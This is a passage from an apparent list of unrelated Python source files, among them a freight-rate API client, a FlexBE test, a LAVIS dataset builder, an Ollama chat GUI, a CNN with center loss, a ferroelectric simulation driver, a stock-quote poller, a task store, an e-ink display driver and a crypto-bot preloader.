shipment[\"portOfOrigin\"],\r\n                        \"portOfOriginCode\": shipment[\"portOfOriginCode\"],\r\n                        \"countryOfDestination\": shipment[\"countryOfDestination\"],\r\n                        \"portOfDestination\": shipment[\"portOfDestination\"],\r\n                        \"portOfDestinationCode\": shipment[\"portOfDestinationCode\"],\r\n                        \"carrier\": shipment[\"carrier\"],\r\n                        \"rate\": shipment[\"generalCargo\"] if shipment[\"generalCargo\"] else shipment[\"hazardousCargo\"],\r\n                        \"validFrom\": shipment[\"validFrom\"],\r\n                        \"validTo\": shipment[\"validTo\"],\r\n                        \"terms\": shipment[\"terms\"],\r\n                        \"bookingLink\": shipment[\"bookingLink\"]\r\n                    }\r\n                    LcL_quote_details.append(shipment_dict)\r\n                return LcL_quote_details\r\n            else:\r\n                print(\"No relevant shipments found.\")\r\n        except ValueError: \r\n            print(f\"Response is not JSON. Response content: {response.text}\")\r\n    else:\r\n        print(f\"Error fetching data. Status code: {response.status_code}. Response content: {response.text}\")\r\n\r\nLcL_freight_quote = fetch_LcL_freight_rates(\"china\", \"kenya\", 100, \"general\", 100, 10, 10, 10, \"inches\")\r\n\r\n# Define Function 2 for FcL API Call\r\n\r\ndef fetch_FcL_freight_rates(origin, destination, container_type, number_of_containers):\r\n    url = f\"yourendpoint?origin={origin}&destination={destination}&containerType={container_type}&numberOfContainers={number_of_containers}\"\r\n    response = requests.get(url)\r\n    print(\"Request made\")\r\n\r\n    if response.ok:\r\n        try:\r\n            data = response.json()\r\n            print(\"Response obtained\")\r\n\r\n            FcL_quote_details = []\r\n        \r\n            relevant_shipments = [\r\n                quote for quote in data\r\n                ]\r\n\r\n            if relevant_shipments:\r\n                print(\"FcL quote details:\")\r\n                for shipment in relevant_shipments:\r\n                    shipment_dict = {\r\n                        \"quoteId\": shipment[\"quoteId\"],\r\n                        \"countryOfOrigin\": shipment[\"countryOfOrigin\"],\r\n                        \"portOfOrigin\": shipment[\"portOfOrigin\"],\r\n                        \"portOfOriginCode\": shipment[\"portOfOriginCode\"],\r\n                        \"countryOfDestination\": shipment[\"countryOfDestination\"],\r\n                        \"portOfDestination\": shipment[\"portOfDestination\"],\r\n                        \"portOfDestinationCode\": shipment[\"portOfDestinationCode\"],\r\n                        \"carrier\": shipment[\"carrier\"],\r\n                        \"validFrom\": shipment[\"validFrom\"],\r\n                        \"validTo\": shipment[\"validTo\"],\r\n                        \"terms\": shipment[\"terms\"],\r\n                        \"bookingLink\": shipment[\"bookingLink\"]\r\n                    }\r\n                    FcL_quote_details.append(shipment_dict)\r\n                return FcL_quote_details\r\n            else:\r\n                print(\"No relevant shipments found.\")\r\n        except ValueError: \r\n            print(f\"Response is not JSON. Response content: {response.text}\")\r\n    else:\r\n        pr",
    "# Copyright 2023 Christopher Newport University\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n#    * Redistributions of source code must retain the above copyright\n#      notice, this list of conditions and the following disclaimer.\n#\n#    * Redistributions in binary form must reproduce the above copyright\n#      notice, this list of conditions and the following disclaimer in the\n#      documentation and/or other materials provided with the distribution.\n#\n#    * Neither the name of the Philipp Schillinger, Team ViGIR, Christopher Newport University nor the names of its\n#      contributors may be used to endorse or promote products derived from\n#      this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n\n\n\"\"\"Pytest testing for turtlebot3_flexbe_states.\"\"\"\n\n\nfrom flexbe_testing.py_tester import PyTester\n\n\nclass TestFlexBEStates(PyTester):\n    \"\"\"Pytest testing for turtlebot3_flexbe_states.\"\"\"\n\n    # def __init__(self, *args, **kwargs):\n    #     \"\"\"Initialize unit test.\"\"\"\n    #     super().__init__(*args, **kwargs)\n\n    @classmethod\n    def setUpClass(cls):\n\n        PyTester._package = \"turtlebot3_flexbe_states\"\n        PyTester._tests_folder = \"tests\"\n\n        PyTester.setUpClass()  # Do this last after setting package and tests folder\n\n    # The tests\n    def test_example_state(self):\n        \"\"\"Run FlexBE unit test given .test file.\"\"\"\n        self.run_test(\"example_state\")\n\n    def test_example_action_state(self):\n        \"\"\"\n        Run FlexBE unit test given .test file.\n\n        This test requires longer wait than normal\n        \"\"\"\n        self.run_test(\"example_action_state\", timeout_sec=2.0, max_cnt=5000)\n",
    "\"\"\"\n Copyright (c) 2022, salesforce.com, inc.\n All rights reserved.\n SPDX-License-Identifier: BSD-3-Clause\n For full license text, see the LICENSE file in the repo root or https://opensource.org/licenses/BSD-3-Clause\n\"\"\"\n\nfrom lavis.datasets.builders.base_dataset_builder import BaseDatasetBuilder\n\nfrom lavis.common.registry import registry\nfrom lavis.datasets.datasets.aok_vqa_datasets import AOKVQADataset, AOKVQAEvalDataset\nfrom lavis.datasets.datasets.coco_vqa_datasets import COCOVQADataset, COCOVQAEvalDataset\nfrom lavis.datasets.datasets.vg_vqa_datasets import VGVQADataset\nfrom lavis.datasets.datasets.gqa_datasets import GQADataset, GQAEvalDataset\n\n\n@registry.register_builder(\"coco_vqa\")\nclass COCOVQABuilder(BaseDatasetBuilder):\n    train_dataset_cls = COCOVQADataset\n    eval_dataset_cls = COCOVQAEvalDataset\n\n    DATASET_CONFIG_DICT = {\n        \"default\": \"configs/datasets/coco/defaults_vqa.yaml\",\n        \"eval\": \"configs/datasets/coco/eval_vqa.yaml\",\n    }\n\n\n@registry.register_builder(\"vg_vqa\")\nclass VGVQABuilder(BaseDatasetBuilder):\n    train_dataset_cls = VGVQADataset\n    DATASET_CONFIG_DICT = {\"default\": \"configs/datasets/vg/defaults_vqa.yaml\"}\n\n\n@registry.register_builder(\"ok_vqa\")\nclass OKVQABuilder(COCOVQABuilder):\n    DATASET_CONFIG_DICT = {\n        \"default\": \"configs/datasets/okvqa/defaults.yaml\",\n    }\n\n\n@registry.register_builder(\"aok_vqa\")\nclass AOKVQABuilder(BaseDatasetBuilder):\n    train_dataset_cls = AOKVQADataset\n    eval_dataset_cls = AOKVQAEvalDataset\n\n    DATASET_CONFIG_DICT = {\"default\": \"configs/datasets/aokvqa/defaults.yaml\"}\n\n\n@registry.register_builder(\"gqa\")\nclass GQABuilder(BaseDatasetBuilder):\n    train_dataset_cls = GQADataset\n    eval_dataset_cls = GQAEvalDataset\n\n    DATASET_CONFIG_DICT = {\n        \"default\": \"configs/datasets/gqa/defaults.yaml\",\n        \"balanced_val\": \"configs/datasets/gqa/balanced_val.yaml\",\n        \"balanced_testdev\": \"configs/datasets/gqa/balanced_testdev.yaml\",\n    }",
    "from tkinter import *\nfrom PIL import ImageTk, Image\nfrom tkinter import scrolledtext, messagebox\nimport ollama\nfrom datetime import datetime\n\n\n\n##########################################################\n# Reading the configuration\n##########################################################e\nwith open('config.txt', 'r') as file:\n    lines = file.readlines()\n\nconfig = {}\n\nfor line in lines:\n\n    key, value = line.strip().split('=')\n    \n\n    key = key.strip()\n    value = value.strip()\n    \n    config[key] = value\n\nif config['debug'] == 'true':\n    print(config)\n\n##########################################################\n# Defining All the functions\n##########################################################\ndef save_conversation():\n    conversation = chat_display.get(\"1.0\", END)\n    with open(f\"conversations/conversation{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt\", \"w\") as file:\n        file.write(conversation)\n    messagebox.showinfo(\"Save Conversation\", \"Conversation saved successfully.\")\n\n\ndef clear_conversation():\n    chat_display.configure(state='normal')\n    chat_display.delete('1.0', END)\n    chat_display.configure(state='disabled')\n\n\n\ndef send_message(event=None):\n    message = entry.get()\n    if message:\n        entry.delete(0, END)\n        \n        response = get_response(message)        \n        chat_display.configure(state='normal')  \n        chat_display.insert(END, \"You: \" + message + \"\\n\")\n        chat_display.insert(END, f\"{config['name']}: \" + response + \"\\n\")\n        chat_display.configure(state='disabled')  \n\ndef get_response(message):\n    try:\n        response = ollama.chat(model=config['model'], messages=[{'role': 'user', 'content': message}])\n        return response['message']['content']\n    except Exception as e:\n        print(\"Error:\", e)\n        return \"Error: Failed to get response from model\"\n\n##########################################################\n# Everything that has to do with the GUI\n##########################################################\nroot = Tk()\nroot.title(config['title'])\n\n\n# Menu Bar\nmenubar = Menu(root)\nroot.config(menu=menubar)\n\nfile_menu = Menu(menubar, tearoff=False)\n\nfile_menu.add_command(\n    label='Save Conversation',\n    command=save_conversation\n)\n\nfile_menu.add_command(\n    label='Clear Conversation',\n    command=clear_conversation\n)\n\nfile_menu.add_command(\n    label='Exit',\n    command=root.destroy\n)\n\n\nmenubar.add_cascade(\n    label=\"File\",\n    menu=file_menu\n)\n\n# loading the image\nif config['image'] == 'true':\n    img = ImageTk.PhotoImage(Image.open(f\"images/{config['imagePath']}.png\"))\n    panel = Label(root, image=img)\n    panel.pack(side=\"left\", fill=\"both\", expand=\"no\")\n\n# Inital Message\ninitial_message = f\"\\n---------- DEBUG ----------\\nConnected To Ollama Server.\\nRunning Version {config['version']}. Model: {config['model']}\"\nchat_display = scrolledtext.ScrolledText(root, wrap=WORD, width=40, height=15, state='normal')\nif config['debug']:\n    chat_display.insert(END, \"Programm: \" + initial_message + \"\\n\")\nchat_display.configure(state='disabled')  \nchat_display.pack(padx=10, pady=10)\n\n# user input\nentry = Entry(root, width=40)\nentry.pack(pady=5)\n\n\n# send button\nsend_button = Button(root, text=\"Send\", command=send_message)\nsend_button.pack(pady=5)\n\n\n# Bind the Enter key to the send_message function\nentry.bind(\"<Return>\", send_message)\n\n# Run the Tkinter event loop\nroot.mainloop()\n",
    "import torch\nfrom torch import nn\nimport torchvision\nfrom torch.nn import functional as F\nfrom torch.utils import data\nfrom matplotlib import pyplot as plt\nfrom torchvision import transforms\n\n\nclass CenterLoss(nn.Module):\n    def __init__(self, cls_num, feat_num):\n        super().__init__()\n        self.cls_num = cls_num\n        # \u4e2d\u5fc3\u70b9\u5b9a\u4e3a\u6a21\u578b\u53c2\u6570(\u521d\u59cb\u503c\u4e3a\u968f\u673a\u6570)\n        self.center = nn.Parameter(torch.randn(cls_num, feat_num))\n\n    def forward(self, _x, _y, lamda):\n        center_exp = self.center.index_select(dim=0, index=_y.long())\n        count = torch.histc(_y.float(), bins=self.cls_num, min=0, max=self.cls_num - 1)\n        count_exp = count.index_select(dim=0, index=_y.long())\n        # return lamda / 2 * torch.mean(torch.div(torch.sqrt(\n        # torch.sum(torch.pow(_x - center_exp, 2), dim=1)), count_exp))\n        return lamda / 2 * torch.mean(torch.div(torch.sum(torch.pow((_x - center_exp), 2), dim=1), count_exp))\n\n\nclass ConvLayer(nn.Module):\n    def __init__(self, in_c, out_c, k, s, p, bias=False):\n        super().__init__()\n        self.cnn_layer = nn.Sequential(\n            nn.Conv2d(in_c, out_c, k, s, p, bias=bias),\n            nn.BatchNorm2d(out_c),\n            nn.ReLU()\n        )\n\n    def forward(self, _x):\n        return self.cnn_layer(_x)\n\n\nclass MainNet(nn.Module):\n    def __init__(self):\n        super().__init__()\n        self.hidden_layer = nn.Sequential(\n            # ConvLayer(1, 32, 5, 1, 2),\n            ConvLayer(3, 32, 5, 1, 2),\n            ConvLayer(32, 64, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(64, 128, 5, 1, 2),\n            ConvLayer(128, 256, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(256, 512, 5, 1, 2),\n            ConvLayer(512, 512, 5, 1, 2),\n            nn.MaxPool2d(2, 2),\n            ConvLayer(512, 256, 5, 1, 2),\n            ConvLayer(256, 128, 5, 1, 2),\n            ConvLayer(128, 64, 5, 1, 2),\n            nn.MaxPool2d(2, 2)\n        )\n\n        self.fc = nn.Sequential(\n            # nn.Linear(64, 2)\n            nn.Linear(64 * 2 * 2, 2)\n        )\n\n        self.output_layer = nn.Sequential(\n            # nn.Linear(2, 10)\n            nn.Linear(2, 100)\n        )\n\n    def forward(self, _x):\n        outs = self.hidden_layer(_x)\n        # outs = outs.reshape(-1, 64)\n        outs = outs.reshape(-1, 64 * 2 * 2)\n        feature = self.fc(outs)\n        # outs = torch.log_softmax(self.output_layer(feature), dim=1)\n        outs = self.output_layer(feature)\n        return feature, outs\n\n\ndef visualize(feats, labels, epoch):\n    # plt.ion()\n    plt.clf()\n    color = [\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555',\n\n        '#DF0029', '#EC870E', '#FCF54C', '#83C75D', '#00B2BF',\n        '#426EB4', '#8273B0', '#AF4A92', '#898989', '#555555'\n    ]\n    for i in range(100):\n        plt.plot(feats[labels == i, 0], feats[labels == i, 1], '.', c=color[i])\n    plt.legend([\n        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n        '10', '11', '12', '13', '14', '15', '16', '17', '18', '19',\n\n        '20', '21', '22', '23', '24', '25', '26', '27', '28', '29',\n        '30', '31', '32', '33', '34', '35', '36', '37', '38', '39',\n\n        '40', '41', '42', '43', '44', '45', '46', '47', '48', '49',\n        '50', '51', '52', '53', '54', '55', '56', '57', '58', '59',\n\n        '60', '61', '62', '63', '64', '65', '66', '67', '68', '69',\n        '70', '71', '72', '73', '74', '75', '76', '77', '78', '79',\n\n        '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',\n        '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',\n    ], loc='upper right')\n    plt.title('epoch=%d' % epoch)\n    plt.savefig('img4/epoch=%d.jpg' % epoch)\n    # plt.pause(0.001)\n    # plt.ioff()\n\n\nif __name__ == '__main__':\n    # \u6d4b\u8bd5\n    # loss_fn = CenterLoss(5, 2)\n    # feat = torch.randn(5, 2, dtype=torch.float32)\n    # y_list = torch.tensor([0, 0, 1, 0, 1], dtype=torch.float32)\n    # loss = loss_fn(feat, y_li",
    "import os\nimport subprocess as sp\nimport shutil\nfrom pathlib import Path\n\nfrom Config import FeramConfig\nimport Config\n\n\ndef control_temperature(\n    config: FeramConfig,\n    sim_name: str,\n    feram_bin: Path,\n    Ti: int,\n    Tf: int,\n    dT: int\n    ):\n    os.makedirs(Path.cwd() / 'dipoRavg', exist_ok=True)\n    os.makedirs(Path.cwd() / 'coords', exist_ok=True)\n\n    for temperature in range(Ti, Tf, dT):\n        avg_file           = Path.cwd() / f'{sim_name}.avg'\n        thermo_file        = Path.cwd() / 'thermo.avg'\n        dipoRavg_file      = Path.cwd() / f'{sim_name}.dipoRavg'\n        temp_dipoRavg_file = Path.cwd() / 'dipoRavg' / f'{temperature}.dipoRavg'\n        last_coord_file    = Path.cwd() / f'{sim_name}.{config.last_coord()}.coord'\n        restart_file       = Path.cwd() / f'{sim_name}.restart'\n        temp_coord_file    = Path.cwd() / 'coords' / f'{temperature}.coord'\n\n\n        config.setup.kelvin = temperature\n        config.write_feram_file(sim_name)\n\n\n        sp.run([feram_bin, f'{sim_name}.feram'], check=True)\n\n        # good?\n        with open(avg_file, 'r') as inf,\\\n            open(thermo_file, 'a+') as outf:\n            outf.write(inf.read())                      # sp.call(f\"cat {name}.avg >> thermo.avg\", shell=True)\n\n        os.remove(avg_file)                             # sp.call(f\"rm {name}.avg\", shell=True)\n        os.rename(dipoRavg_file, temp_dipoRavg_file)    # sp.call(f\"mv {sim_name}.dipoRavg ./dipoRavg/{temperature}.dipoRavg\", shell=True)\n        shutil.copy2(last_coord_file, restart_file)     # sp.call(f\"cp ./{sim_name}.{config.last_coord()}.coord ./{sim_name}.restart\")\n        os.rename(last_coord_file, temp_coord_file)     # sp.call(f\"mv ./{sim_name}.{config.last_coord()}.coord ./coords/{temperature}.coord\", shell=True)\n\n    # spb.call(f\"rm {NAME}.restart\", shell=True)\n\n\ndef measure_electrocaloriceffect(\n    sim_name:  str,\n    feram_bin: Path,\n    params:    dict\n    ):\n    \"\"\"Electrocaloric Effect\"\"\"\n\n    cwd = Path.cwd()\n    step1_preNPT  = cwd / '1_preNPT'\n    step2_preNPE  = cwd / '2_preNPE'\n    step3_rampNPE = cwd / '3_rampNPE'\n    step4_postNPE = cwd / '4_postNPE'\n\n\n    [ os.makedirs(step, exist_ok=True) for step in [step1_preNPT, step2_preNPE, step3_rampNPE, step4_postNPE] ]\n\n    os.chdir(step1_preNPT)\n    config = Config.FeramConfig(\n        setup = Config.SetupStaticElecField(\n            n_thermalize = params['n_thermalize_step1_preNPT'],\n            n_average    = params['n_average_step1_preNPT'],\n            n_coord_freq = params['n_coord_freq_step1_preNPT'],\n            external_E_field = params['initial_Efield'],\n        ),\n        material = params['material']\n    )\n    feram_file      = f'{sim_name}.feram'\n    last_coord_file = f'{sim_name}.{config.last_coord()}.coord'\n    restart_file    = f'{sim_name}.restart'\n    config.write_feram_file(feram_file)\n    sp.run([feram_bin, feram_file], check=True)\n    os.chdir(cwd)\n    shutil.copy2(step1_preNPT / last_coord_file, step2_preNPE / restart_file)     # sp.call(f\"cp ./{sim_name}.{config.last_coord()}.coord ./{sim_name}.restart\")\n\n    os.chdir(step2_preNPE)\n    config = Config.FeramConfig(\n        setup = Config.SetupStaticElecField(\n            method       = 'lf',\n            n_thermalize = params['n_thermalize_step2_preNPE'],\n            n_average    = params['n_average_step2_preNPE'],\n            n_coord_freq = params['n_coord_freq_step2_preNPE'],\n            external_E_field = params['initial_Efield'],\n        ),\n        material = params['material']\n    )\n    last_coord_file = f'{sim_name}.{config.last_coord()}.coord'\n    config.write_feram_file(feram_file)\n    sp.run([feram_bin, feram_file], check=True)\n    os.chdir(cwd)\n    shutil.copy2(step2_preNPE / last_coord_file, step3_rampNPE / restart_file)     # sp.call(f\"cp ./{sim_name}.{config.last_coord()}.coord ./{sim_name}.restart\")\n\n    os.chdir(step3_rampNPE)\n    config = Config.FeramConfig(\n        setup = Config.SetupDynamicElecField(\n            method          = 'lf',\n            n_thermalize    = params['n_thermalize_step3_rampNPE'],\n            n_average       = params['n_average_step3_rampNPE'],\n            n_coord_freq    = params['n_coord_freq_step3_rampNPE'],\n            n_hl_freq       = params['n_hl_freq_step3_rampNPE'],\n            n_E_wave_period = params['n_E_wave_period_step3_rampNPE'],\n            E_wave_type     = params['E_wave_type_step3_rampNPE'],\n            external_E_field = params['initial_Efield']\n        ),\n        material =  params['material']\n    )\n    last_coord_file = f'{sim_name}.{config.last_coord()}.coord'\n    config.write_feram_file(feram_file)\n    sp.run([feram_bin, feram_file], check=True)\n    os.chdir(cwd)\n    shutil.copy2(step3_rampNPE / last_coord_file, step4_postNPE / restart_file)     # sp.call(f\"cp ./{sim_name}.{config.last_coord()}.coord ./{sim_name}.restart\")\n\n    os.chdir(step4_postNPE)\n    config = Config.FeramConfig(\n        setup = Config.SetupStaticElecField(\n            method           = 'lf',\n           ",
    "import os\nimport json\nimport httpx\nimport logging\nimport kafka_pub\nfrom prometheus_client import Counter\nimport asyncio\nfrom gauges import quote_gauge_update\n\nQUOTES_URL='https://data.alpaca.markets/v2/stocks/quotes/latest'\nlast_quotes={}\n\ndef is_dupe(symbol, quote):\n    global last_quotes\n    if symbol in last_quotes and quote[\"t\"] == last_quotes[symbol][\"t\"]:\n        logging.debug(\"Duplicate quote for \" + symbol)\n        return True\n    else:\n        last_quotes[symbol] = quote\n        return False\n\ndef prep_request(symbols, auth_headers):\n    return httpx.Request(\n        'GET',\n        QUOTES_URL,\n        params={'symbols': ','.join(symbols)},\n        headers=auth_headers\n    )\n\nasync def poller(symbols, interval, auth_headers):\n    request_ctr = Counter('poll_requests', 'Number of HTTP requests')\n    quote_ctr = Counter('poll_quotes', 'Number of unique quotes', ['symbol'])\n    error_ctr = Counter('poll_errors', 'Number of polling errors')\n    prepped = prep_request(symbols, auth_headers)\n    async with httpx.AsyncClient(http2=True) as client:\n        while True:\n            response = await client.send(prepped)\n            request_ctr.inc()\n            if (response.status_code == httpx.codes.ok):\n                quotes = response.json()['quotes']\n                for symbol in quotes.keys():\n                    logging.info(f\"Quote: {quotes[symbol]}\")\n                    if not is_dupe(symbol, quotes[symbol]):\n                        await kafka_pub.publish(symbol, 'quote', quotes[symbol])\n                        quote_ctr.labels(symbol).inc()\n                        quote_gauge_update(symbol, quotes[symbol])\n                await kafka_pub.flush()\n            else:\n                logging.error('Error retrieving quotes: ' + response.text)\n                error_ctr.inc()\n            await asyncio.sleep(interval)\n",
    "import json\nimport os\n\nfilename = \"./tasks.json\"   #   Run on No IDE   #\n# filename = \"./DevSecOps/python/tasks_API/tasks.json\"   #   Ubuntu   #\n# filename = 'C:\\\\Users\\\\Stas\\\\Desktop\\\\DevOps\\\\DevSecOps\\\\python\\\\tasks_API\\\\tasks.json'   #   Windows   #\n# pathlib\n\n# Check if Json file exsist, if not create it.\ndef ensure_file_exists():\n    if not os.path.exists(filename):\n        with open(filename, 'w') as file:\n            json.dump({ \"next_task_id\":1, \"tasks\":[  ]}, file)\n\nensure_file_exists()\n\n\n# Get all tasks\ndef get_all_tasks():\n    with open(filename, \"r\") as file:\n        data = json.load(file)\n        return data\n\n# Get single task\ndef get_single_task(task_id):\n    tasks = get_all_tasks()\n    for task in tasks[\"tasks\"]:\n            if task['id'] == task_id:\n                return json.dumps(task)              \n    return json.dumps({\"message\": \"Task not found, This slot ia empty\"})\n\n# Add new task\ndef add_new_task(new_task):\n    tasks = get_all_tasks()\n    \n    title = new_task.get('title')\n    details = new_task.get('details')\n    if title is None or details is None:\n        return json.dumps({\"error\": \"Title and details are required fields.\"})\n    task_id = tasks[\"next_task_id\"]\n    tasks[\"next_task_id\"] +=1\n    task = {'id': task_id, 'title': title, 'details': details}\n    tasks[\"tasks\"].append(task)\n    with open(filename, \"w\") as file:\n        json.dump(tasks, file)\n    return json.dumps({\"message\": f\"Task number {task_id} was added\"})\n\n\n# Update existing task\ndef update_task(task_id, data):\n    with open(filename, \"r\") as file:\n        tasks = json.load(file)\n    for task in tasks[\"tasks\"]:\n        if task['id'] == task_id:\n            task['title'] = data.get('title', task['title'])\n            task['details'] = data.get('details', task['details'])\n            with open(filename, \"w\") as file:\n                json.dump(tasks, file)\n            return task\n    return None\n\n# Delete existing task\ndef delete_task(task_id):\n    with open(filename, \"r\") as file:\n        tasks = json.load(file)\n    for task in tasks[\"tasks\"]:\n        if task['id'] == task_id:\n            tasks[\"tasks\"].remove(task)\n            with open(filename, \"w\") as file:\n                json.dump(tasks, file)\n            return task\n    return None\n\n",
    "import logging\n\nimport pwnagotchi.ui.fonts as fonts\nfrom pwnagotchi.ui.hw.base import DisplayImpl\n\n\nclass Inky(DisplayImpl):\n    def __init__(self, config):\n        super(Inky, self).__init__(config, 'inky')\n\n    def layout(self):\n        fonts.setup(10, 8, 10, 28, 25, 9)\n        self._layout['width'] = 250\n        self._layout['height'] = 122\n        self._layout['face'] = (0, 37)\n        self._layout['name'] = (5, 18)\n        self._layout['channel'] = (0, 0)\n        self._layout['aps'] = (30, 0)\n        self._layout['uptime'] = (147, 0)\n        self._layout['line1'] = [0, 12, 212, 12]\n        self._layout['line2'] = [0, 92, 212, 92]\n        self._layout['friend_face'] = (0, 76)\n        self._layout['friend_name'] = (40, 78)\n        self._layout['shakes'] = (0, 93)\n        self._layout['mode'] = (187, 93)\n        self._layout['status'] = {\n            'pos': (102, 18),\n            'font': fonts.status_font(fonts.Small),\n            'max': 20\n        }\n        return self._layout\n\n    def initialize(self):\n        logging.info(\"initializing inky display\")\n\n        if self.config['color'] == 'fastAndFurious':\n            logging.info(\"Initializing Inky in 2-color FAST MODE\")\n            logging.info(\"THIS MAY BE POTENTIALLY DANGEROUS. NO WARRANTY IS PROVIDED\")\n            logging.info(\"USE THIS DISPLAY IN THIS MODE AT YOUR OWN RISK\")\n\n            from pwnagotchi.ui.hw.libs.inkyphat.inkyphatfast import InkyPHATFast\n            self._display = InkyPHATFast('black')\n            self._display.set_border(InkyPHATFast.BLACK)\n        elif self.config['color'] == 'auto':\n            from inky.auto import auto\n            self._display = auto()\n            self._display.set_border(self._display.BLACK)\n            self._layout['width'] = self._display.WIDTH\n            self._layout['height'] = self._display.HEIGHT\n        else:\n            from inky import InkyPHAT\n            self._display = InkyPHAT(self.config['color'])\n            self._display.set_border(InkyPHAT.BLACK)\n\n    def render(self, canvas):\n        if self.config['color'] == 'black' or self.config['color'] == 'fastAndFurious':\n            display_colors = 2\n        else:\n            display_colors = 3\n\n        img_buffer = canvas.convert('RGB').convert('P', palette=1, colors=display_colors)\n        if self.config['color'] == 'red':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 0, 0  # index 2 is red\n            ])\n        elif self.config['color'] == 'yellow':\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0,  # index 1 is black\n                255, 255, 0  # index 2 is yellow\n            ])\n        else:\n            img_buffer.putpalette([\n                255, 255, 255,  # index 0 is white\n                0, 0, 0  # index 1 is black\n            ])\n\n        self._display.set_image(img_buffer)\n        try:\n            self._display.show()\n        except:\n            logging.exception(\"error while rendering on inky\")\n\n    def clear(self):\n        self._display.Clear()\n",
    "### Sunflow Cryptobot ###\n#\n# Preload ticker, klines, instrument info and other data\n\n# Load external libraries\nfrom pathlib import Path\nfrom pybit.unified_trading import HTTP\nimport importlib, os, sys\n\n# Load internal libraries\nimport argparse, database, defs, orders\n\n# Parse command line arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('-c', '--config', default='config.py')\nargs = parser.parse_args()\n\n# Resolve config file path\nconfig_path = Path(args.config).resolve()\nif not config_path.exists():\n    print(f\"Config file not found at {config_path}, aborting...\\n\")\n    sys.exit()\n\n# Dynamically load the config module\nsys.path.append(str(config_path.parent))\nconfig_module_name = config_path.stem\nconfig = importlib.import_module(config_module_name)\n\n# Debug\ndebug = False\n\n# Connect to exchange\nsession = HTTP(\n    testnet = False,\n    return_response_headers = True\n)\n\n# Preload ticker\ndef get_ticker(symbol):\n\n    # Initialize ticker\n    ticker = {'time': 0, 'lastPrice': 0}\n   \n    # Load ticker via normal session\n    message = defs.now_utc()[1] + \"Preload: get_ticker: session: get_tickers\\n\"\n    print(message)\n    pre_ticker = {}\n    try:\n        pre_ticker   = session.get_tickers(\n            category = \"spot\",\n            symbol   = symbol,\n        )\n    except Exception as e:\n        defs.log_error(e)\n\n    # Check API rate limit and log data if possible\n    if pre_ticker:\n        pre_ticker = defs.rate_limit(pre_ticker)\n        defs.log_exchange(pre_ticker, message)\n   \n    # Transform ticker into required format\n    ticker['time']      = int(pre_ticker['time'])\n    ticker['symbol']    = pre_ticker['result']['list'][0]['symbol']\n    ticker['lastPrice'] = float(pre_ticker['result']['list'][0]['lastPrice'])\n    \n    # Output to stdout\n    print(defs.now_utc()[1] + \"Preload: get_ticker: Initial ticker loaded!\\n\")\n    \n    if debug:\n        print(defs.now_utc()[1])\n        print(ticker)\n       \n    #return ticker\n    return ticker\n\n# Preload klines\ndef get_klines(symbol, interval, limit):\n   \n    # Debug\n    debug = False\n    \n    # Initialize klines\n    klines = {'time': [], 'open': [], 'high': [], 'low': [], 'close': [], 'volume': [], 'turnover': []}\n    \n    # Load klines via normal session\n    message = defs.now_utc()[1] + \"Orders: get_klines: session: get_kline\\n\"\n    print(message)\n    pre_klines = {}\n    try:\n        pre_klines = session.get_kline(\n            category = \"spot\",\n            symbol   = symbol,\n            interval = interval,\n            limit    = limit\n        )\n    except Exception as e:\n        defs.log_error(e)\n\n    # Check API rate limit and log data if possible\n    if pre_klines:\n        pre_klines = defs.rate_limit(pre_klines)\n        defs.log_exchange(pre_klines, message)\n    \n    # Transform klines into required format\n    for item in pre_klines['result']['list']:\n        klines['time'].append(int(item[0]))\n        klines['open'].append(float(item[1]))\n        klines['high'].append(float(item[2]))\n        